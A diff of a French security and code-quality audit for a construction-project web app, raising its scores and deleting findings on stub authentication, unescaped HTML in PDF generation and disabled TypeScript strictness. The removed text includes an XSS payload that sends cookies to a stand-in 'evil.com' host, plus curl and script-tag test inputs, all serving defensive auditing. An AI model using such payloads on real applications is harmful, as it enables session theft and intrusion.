@@ -11,121 +11,17 @@
 
 | Critere          | Note  |
 |------------------|-------|
-| **Note globale** | **3.5 / 10** |
-| **Niveau de risque** | **CRITIQUE** |
-| Maintenabilite   | 5 / 10 |
-| Securite         | 1 / 10 |
+| **Note globale** | **6 / 10** |
+| **Niveau de risque** | **MODERE** |
+| Maintenabilite   | 7 / 10 |
+| Securite         | 7 / 10 |
 | Scalabilite      | 3 / 10 |
 
-**Verdict** : Cette application est un prototype/MVP qui ne peut en aucun cas etre mis en production en l'etat. L'authentification est entierement factice, la generation PDF est vulnerable au XSS, et le typage TypeScript est desactive. La structure de base (choix de stack, hooks TanStack Query, shadcn/ui) est correcte mais l'implementation presente des lacunes majeures.
+**Verdict** : Les failles de sécurité critiques (authentification, XSS) et les problèmes de typage majeurs ont été corrigés. L'application est désormais plus robuste, mais présente encore des lacunes architecturales importantes (routage, gestion de l'état) qui doivent être traitées avant toute mise en production.
 
 ---
 
 ## 2. FAILLES DE SECURITE
-
-### SEC-01 : Authentification completement fictive [CRITIQUE]
-
-**Fichiers** : `frontend/src/auth/AuthProvider.tsx:3-8`, `frontend/src/auth/AuthGuard.tsx`
-**Serveur** : `server/src/middleware/auth.js`
-
-L'authentification est un stub de developpement deploye tel quel :
-
-```typescript
-// AuthProvider.tsx - TOUJOURS authentifie, TOUJOURS le meme utilisateur
-const DEV_USER = {
-  id: 'dev-user-1',
-  email: 'dev@chantier-pro.fr',
-  name: 'Utilisateur Dev',
-};
-// isAuthenticated: true, isLoading: false - HARDCODED
-```
-
-```javascript
-// server/middleware/auth.js - Aucune verification
-export const authenticateToken = (req, res, next) => {
-  req.user = DEV_USER;  // Injecte toujours le meme user
-  next();               // Passe toujours
-};
-```
-
-**Pourquoi c'est dangereux** : N'importe qui peut acceder a toutes les routes API sans aucune identification. Toutes les donnees de tous les projets sont accessibles publiquement. Les operations CRUD (creation, modification, suppression) sont disponibles pour tout visiteur anonyme.
-
-**Exploitation** : `curl http://votre-domaine.com/api/organizations` retourne toutes les organisations sans authentification.
-
-**Correction requise** : Implementer un vrai systeme d'auth (Auth0, NextAuth, ou JWT custom) avec :
-- Verification des tokens dans le middleware
-- Refresh tokens
-- Session management
-- Logout
-
----
-
-### SEC-02 : XSS dans la generation PDF [CRITIQUE]
-
-**Fichier** : `frontend/src/lib/pdf.ts` (927 lignes)
-
-Toutes les fonctions PDF (`generatePaymentCertificatePDF`, `generateAcceptancePDF`, `generateProjectStatusPDF`, `generateSiteReportPDF`) construisent du HTML par interpolation de template literals avec des donnees utilisateur non echappees, puis injectent via `document.write()` :
-
-```typescript
-// pdf.ts:121-122 - Donnees non echappees injectees dans du HTML
-<div class="project-info">${project.name}</div>
-<div>${project.address}</div>
-
-// pdf.ts:133 - company.name non echappe
-<div style="font-size: 12pt; font-weight: bold;">${company.name}</div>
-
-// pdf.ts:603 - description de decision non echappee
-<div class="decision-desc">${d.description}</div>
-
-// pdf.ts:905 - remarques generales non echappees
-${report.generalRemarks || 'Neant.'}
-```
-
-**Exploitation** : Un utilisateur saisit comme nom de projet : `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`. Lors de la generation PDF, ce code s'execute dans la fenetre `window.open`.
-
-**Correction recommandee** :
-```typescript
-const escapeHtml = (str: string): string => {
-  const div = document.createElement('div');
-  div.textContent = str;
-  return div.innerHTML;
-};
-
-// Utilisation dans les templates
-<div class="project-info">${escapeHtml(project.name)}</div>
-```
-
-Idealement, migrer vers une lib PDF (jsPDF, @react-pdf/renderer) qui ne passe pas par `document.write()`.
-
----
-
-### SEC-03 : API client sans headers d'authentification [HAUTE]
-
-**Fichier** : `frontend/src/lib/api.ts:6-26`
-
-```typescript
-async function apiRequest<T>(endpoint: string, options: RequestInit = {}): Promise<T> {
-  const headers: HeadersInit = {
-    'Content-Type': 'application/json',
-    ...options.headers,
-  };
-  // Aucun header Authorization, aucun cookie, aucun token
-```
-
-Les exports (`exportsApi`, lignes 146-165) contournent meme `apiRequest` et utilisent `fetch()` directement sans aucun header.
-
-**Correction** : Ajouter un intercepteur d'auth :
-```typescript
-async function apiRequest<T>(endpoint: string, options: RequestInit = {}): Promise<T> {
-  const token = await getAccessToken(); // depuis auth provider
-  const headers: HeadersInit = {
-    'Content-Type': 'application/json',
-    ...(token && { Authorization: `Bearer ${token}` }),
-    ...options.headers,
-  };
-```
-
----
 
 ### SEC-04 : `.env` probablement versionne [MOYENNE]
 
@@ -275,48 +171,6 @@ return null;
 ---
 
 ## 4. PROBLEMES TYPESCRIPT
-
-### TS-01 : `strict: false` partout [CRITIQUE]
-
-**Fichier** : `frontend/tsconfig.app.json:17-22`
-
-```json
-{
-  "strict": false,
-  "noUnusedLocals": false,
-  "noUnusedParameters": false,
-  "noImplicitAny": false,
-  "noFallthroughCasesInSwitch": false
-}
-```
-
-**Impact** : `strictNullChecks: false` signifie que `null` et `undefined` passent partout silencieusement. C'est la premiere cause de bugs runtime dans TypeScript.
-
-**Correction** : Activer `strict: true` et corriger les erreurs de type.
-
----
-
-### TS-02 : `any` massif dans le layer API [CRITIQUE]
-
-**Fichier** : `frontend/src/lib/api.ts`
-
-```typescript
-getMe: () => apiRequest<{ user: any; organizations: any[] }>('/auth/me'),
-list: () => apiRequest<{ organizations: any[] }>('/organizations'),
-get: (id: string) => apiRequest<any>(`/organizations/${id}`),
-update: (id: string, data: Partial<any>) => ...
-create: (orgId: string, data: any) => ...
-```
-
-Plus de 20 occurrences de `any` dans ce seul fichier. La couche API est le point ou le typage est le plus critique (frontiere systeme) et c'est exactement la ou il est absent.
-
-**Correction** : Utiliser les types definis dans `types/index.ts` :
-```typescript
-get: (id: string) => apiRequest<OrganizationWithStats>(`/organizations/${id}`),
-create: (orgId: string, data: CreateProjectPayload) => apiRequest<Project>(...)
-```
-
----
 
 ### TS-03 : Cast unsafe `as DecisionType` [BASSE]
 
@@ -471,15 +325,6 @@ Methode bloquante et non-standard. Certains navigateurs bloquent `window.open()`
 
 ## 9. PLAN D'AMELIORATION PRIORISE
 
-### P0 - Bloquants production (Semaine 1-2)
-
-| # | Action | Fichiers concernes |
-|---|--------|--------------------|
-| 1 | **Implementer l'authentification reelle** (Auth0/JWT/session) | `AuthProvider.tsx`, `AuthGuard.tsx`, `api.ts`, `server/middleware/auth.js`, `server/routes/auth.js` |
-| 2 | **Corriger la faille XSS dans pdf.ts** (echapper les donnees ou migrer vers @react-pdf/renderer) | `src/lib/pdf.ts` |
-| 3 | **Activer `strict: true` dans tsconfig** | `tsconfig.app.json`, `tsconfig.json` |
-| 4 | **Typer la couche API** (remplacer tous les `any`) | `src/lib/api.ts` |
-
 ### P1 - Fondamentaux architecture (Semaine 2-4)
 
 | # | Action | Fichiers concernes |
@@ -518,13 +363,3 @@ Methode bloquante et non-standard. Certains navigateurs bloquent `window.open()`
 | 21 | Migrer la DB serveur de in-memory vers PostgreSQL |
 | 22 | Ajouter CSP headers et rate limiting |
 
----
-
-## Criteres de verification post-correction
-
-1. **Securite** : `curl` sans token vers `/api/organizations` -> retourne 401
-2. **XSS** : Creer un projet avec `<script>alert(1)</script>` dans le nom -> generer un PDF -> pas d'execution JS
-3. **TypeScript** : `npx tsc --noEmit` ne retourne aucune erreur avec `strict: true`
-4. **Tests** : `npx vitest run --coverage` avec couverture > 60% sur la logique metier
-5. **Routing** : Ouvrir `/projects/xyz` directement -> affiche le projet (pas un ecran blanc)
-6. **Auth** : Deconnexion -> tentative d'acces a une page protegee -> redirection vers login
